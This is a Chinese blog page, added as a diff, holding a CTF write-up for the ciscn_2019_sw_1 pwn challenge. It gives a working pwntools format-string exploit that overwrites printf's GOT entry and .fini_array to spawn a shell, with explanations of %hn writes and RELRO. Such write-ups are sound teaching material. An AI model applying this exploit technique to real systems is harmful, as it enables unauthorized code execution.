@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="blog, tech, hexo">
+    <meta name="description" content="记录技术与思考">
+    <meta name="author" content="zach0ry">
+    
+    <title>
+        
+            ciscn_2019_sw_1 |
+        
+        b1nary
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/fire.svg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"zach0ry-zzh.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"b1nary","author":"zach0ry","avatar":"/images/author.jpg","logo":"/images/fire.svg","favicon":"/images/fire.svg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","tags":"/tags || fa-solid fa-tags","categories":"/categories || fa-solid fa-layer-group"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":true,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["炼气","筑基","结丹","元婴","化神","渡劫","大乘"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD","copyright_info":false,"share":true,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"search":{"path":"search.json","field":"post","content":true,"format":"striptags"},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/fire.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               b1nary
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-layer-group"></i>
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
+                                </span>
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                </span>
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
+                                </span>
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-layer-group"></i>
+                                </span>
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        ciscn_2019_sw_1
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/author.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">zach0ry</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-07-22</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Mon Feb 09 2026 10:49:17 GMT+0800">2026-02-09</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/exercise/">exercise</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/fini-array/">fini_array</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%88%86%E5%AD%97%E8%8A%82/">分字节</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">格式化字符串</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/stack/">stack</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250722195944420.png"  alt="image-20250722195944420"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250722195955564.png"  alt="image-20250722195955564"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250722200010121.png"  alt="image-20250722200010121"></p>
+<p>存在system函数，不需要泄露libc的地址</p>
+<p>直接把printf的got表地址覆盖为system函数的地址，然后传递参数为“&#x2F;bin&#x2F;sh”即可</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250722201828291.png"  alt="image-20250722201828291">而且偏移是4</p>
+<p>但是该格式化字符串漏洞只被执行了一次，无法实现操作</p>
+<p>所以要修改收尾函数的地址以实现对格式化字符串漏洞的多次调用</p>
+<p>用readelf去找fini_array的地址</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250722201754516.png"  alt="image-20250722201754516"></p>
+<p>脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">#p=process(&quot;./ciscn_2019_sw_1&quot;)</span><br><span class="line">p=remote(&quot;node5.buuoj.cn&quot;,29318)</span><br><span class="line">elf=ELF(&quot;./ciscn_2019_sw_1&quot;)</span><br><span class="line">fini=0x0804979c</span><br><span class="line">printf=elf.got[&quot;printf&quot;]</span><br><span class="line">main=0x08048534</span><br><span class="line">sys=0x080483D0</span><br><span class="line"></span><br><span class="line">sys_h=(sys&gt;&gt;16)&amp;0xffff</span><br><span class="line">sys_l=sys&amp;0xffff</span><br><span class="line">main_h=(main&gt;&gt;16)&amp;0xffff</span><br><span class="line">main_l=main&amp;0xffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p32(fini+2)+p32(printf+2)+p32(printf)+p32(fini)</span><br><span class="line">payload+=b&quot;%&quot;+bytes(str(main_h-16),&quot;utf_8&quot;)+b&quot;c%4$hn&quot;#%c的意思是打印n个字符</span><br><span class="line">payload+=b&quot;%5$hn&quot;</span><br><span class="line">payload+=b&quot;%&quot;+bytes(str(sys_l-main_h),&quot;utf_8&quot;)+b&quot;c%6$hn&quot;</span><br><span class="line">payload+=b&quot;%&quot;+bytes(str(main_l-sys_l),&quot;utf_8&quot;)+b&quot;c%7$hn&quot;</span><br><span class="line">payload += b&#x27;\x00&#x27;</span><br><span class="line">p.sendlineafter(b&quot;name?\n&quot;,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=b&quot;/bin/sh&quot;</span><br><span class="line">p.sendlineafter(b&quot;name?\n&quot;,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p><strong>注意</strong></p>
+<p>四个写入的数是递增的</p>
+<p><strong>如何取高 16 位</strong></p>
+<ul>
+<li><p>地址右移 16 位：<code>system_plt &gt;&gt; 16</code></p>
+<ul>
+<li><p>把高 16 位“移到”最低位</p>
+</li>
+<li><p>对于 <code>0x080483d0</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x080483d0 &gt;&gt; 16  = 0x0804</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>为什么还要 <code>&amp; 0xffff</code>？</p>
+<ul>
+<li>因为高 16 位虽然已经移到低位了，但 Python 整数没有“溢出”概念。</li>
+<li>为了确保最终结果只保留低 16 位（即最大不超过 <code>0xffff</code>），就用掩码 <code>0xffff</code> 取最低 16 位。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;%&#x27; + bytes(str(xxx), &quot;utf-8&quot;) + b&#x27;c%4$hn&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这里的含义是：</p>
+<ol>
+<li>这串字符串拼接后是啥样？<br>举个例子，假设 xxx &#x3D; 100，拼接结果是：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;%100c%4$hn&#x27;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>这在格式化字符串里的意思<br>%100c ：向输出缓冲区写入 100个空格字符，使得“已经输出字符数”加100。</li>
+</ol>
+<p>%4$hn ：把当前的输出字符数（现在应该是前面已有字符数 + 100）写入 第4个参数指向的地址，写入2字节。</p>
+<h2 id="为什么不用-n-直接写-4-字节？"><a href="#为什么不用-n-直接写-4-字节？" class="headerlink" title="为什么不用 %n 直接写 4 字节？"></a>为什么不用 <code>%n</code> 直接写 4 字节？</h2><p>（两个字节用hn,四字节用n）</p>
+<p>理论上可以直接用 <code>%n</code> 一次写完整 4 字节（一个 <code>int</code>），但是：</p>
+<p>1️⃣ 数字范围的问题</p>
+<ul>
+<li><p>如果你想写的数是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">复制编辑</span><br><span class="line">0x08048534</span><br></pre></td></tr></table></figure>
+
+<p>那就是：134513204（十进制），而格式化字符串里的输出字符数必须刚好是这个数才能写出来。</p>
+</li>
+<li><p>你需要输出 134,513,204 个字符才能让 <code>%n</code> 写出这个数……显然不现实，程序很可能崩溃或超时。</p>
+</li>
+</ul>
+<h2 id="fini-array原理"><a href="#fini-array原理" class="headerlink" title="fini.array原理"></a>fini.array原理</h2><p>🛡️ 1️⃣ RELRO 与各段的可写性</p>
+<p>ELF 程序里有这几个关键的表&#x2F;段：</p>
+<table>
+<thead>
+<tr>
+<th>段&#x2F;表</th>
+<th>正常作用</th>
+<th>为什么能写</th>
+<th>RELRO保护后的变化</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>.got.plt</strong></td>
+<td>存储动态链接函数的真实地址（lazy binding后）</td>
+<td>lazy binding 需要写入真实地址</td>
+<td><strong>NO RELRO</strong> 时可写，<strong>PARTIAL RELRO</strong> 也可写，<strong>FULL RELRO</strong> 时不可写</td>
+</tr>
+<tr>
+<td><strong>.init_array</strong></td>
+<td>程序启动时调用的函数数组</td>
+<td>存函数指针</td>
+<td><strong>NO RELRO</strong> 时可写，<strong>PARTIAL&#x2F;FULL</strong> 时不可写</td>
+</tr>
+<tr>
+<td><strong>.fini_array</strong></td>
+<td>程序退出时调用的函数数组</td>
+<td>存函数指针</td>
+<td><strong>NO RELRO</strong> 时可写，<strong>PARTIAL&#x2F;FULL</strong> 时不可写</td>
+</tr>
+</tbody></table>
+<p>✨<br>✅ <code>.fini_array</code> 存的是退出时要调用的函数指针。<br>✅ 利用时先把 <code>.fini_array=main</code>，退出时重启 main，给你多一次利用机会。<br>✅ 通常 <code>.fini_array</code> 只有一个指针的位置，只能写一个。</p>
+<p>🔁 为什么 <code>.fini_array</code> 能帮忙</p>
+<p>因为：<br> 1️⃣ 程序退出时，libc 会主动去遍历 <code>.fini_array</code>，执行里面的函数指针。<br> 2️⃣ 默认 <code>.fini_array[0]</code> 指向某个收尾函数。<br> 3️⃣ 如果你把 <code>.fini_array[0]</code> 改成 <code>main</code> 的地址，那程序在退出时就会再一次调用 <code>main</code>，相当于重启了程序。</p>
+<p><strong>收尾函数、是程序退出（或结束）前，操作系统或运行时环境会调用这些函数来做善后工作</strong>。</p>
+<p>流程大致是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main 函数执行 → main 返回 → 运行时开始调用“收尾函数” → 资源释放完毕 → 程序完全退出</span><br></pre></td></tr></table></figure>
+
+<h2 id="sendlineafter-vs-sendafter-的区别"><a href="#sendlineafter-vs-sendafter-的区别" class="headerlink" title="sendlineafter() vs sendafter() 的区别"></a><strong><code>sendlineafter()</code> vs <code>sendafter()</code> 的区别</strong></h2><table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">行为</th>
+<th align="left">是否自动加 <code>\n</code></th>
+<th align="left">适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>sendlineafter()</code></td>
+<td align="left">等待特定字符串出现后发送数据，<strong>自动在末尾加 <code>\n</code>（换行符）</strong></td>
+<td align="left">✅ 是</td>
+<td align="left">适用于需要换行符的交互（如 <code>scanf</code>、<code>gets</code>、<code>fgets</code>）</td>
+</tr>
+<tr>
+<td align="left"><code>sendafter()</code></td>
+<td align="left">等待特定字符串出现后发送数据，<strong>不自动加 <code>\n</code></strong></td>
+<td align="left">❌ 否</td>
+<td align="left">适用于不需要换行符的交互（如 <code>read</code>、<code>recv</code>）</td>
+</tr>
+</tbody></table>
+<p>在这里我们是用scanf读取数据，它在读取到&#x2F;n时才会停止，所以要用<code>sendlineafter()</code></p>
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/fini-array/">fini_array</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%88%86%E5%AD%97%E8%8A%82/">分字节</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">格式化字符串</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/stack/">stack</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/07/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6/"
+                                   title="栈溢出进阶"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">栈溢出进阶</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"
+                                   title="格式化字符串"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">格式化字符串</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E7%94%A8-n-%E7%9B%B4%E6%8E%A5%E5%86%99-4-%E5%AD%97%E8%8A%82%EF%BC%9F"><span class="nav-number">1.</span> <span class="nav-text">为什么不用 %n 直接写 4 字节？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fini-array%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">fini.array原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sendlineafter-vs-sendafter-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">3.</span> <span class="nav-text">sendlineafter() vs sendafter() 的区别</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">zach0ry</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E7%94%A8-n-%E7%9B%B4%E6%8E%A5%E5%86%99-4-%E5%AD%97%E8%8A%82%EF%BC%9F"><span class="nav-number">1.</span> <span class="nav-text">为什么不用 %n 直接写 4 字节？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fini-array%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">fini.array原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sendlineafter-vs-sendafter-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">3.</span> <span class="nav-text">sendlineafter() vs sendafter() 的区别</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
